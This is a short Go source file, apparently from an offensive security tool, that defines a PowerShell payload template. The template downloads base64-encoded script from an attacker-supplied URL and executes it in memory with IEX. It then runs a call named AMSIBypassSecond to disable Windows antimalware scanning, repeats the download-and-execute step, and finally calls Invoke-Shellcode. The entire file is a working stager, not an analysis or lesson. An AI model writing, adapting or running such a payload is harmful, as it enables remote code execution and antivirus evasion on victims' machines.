package resources

var Payload string = `
ForEach ($line in $((New-Object Net.WebClient).DownloadString('%s') -split "\n"))
{
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($line)) | IEX
}
AMSIBypassSecond
ForEach ($line in $((New-Object Net.WebClient).DownloadString('%s') -split "\n"))
{
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($line)) | IEX
}
Invoke-Shellcode
`
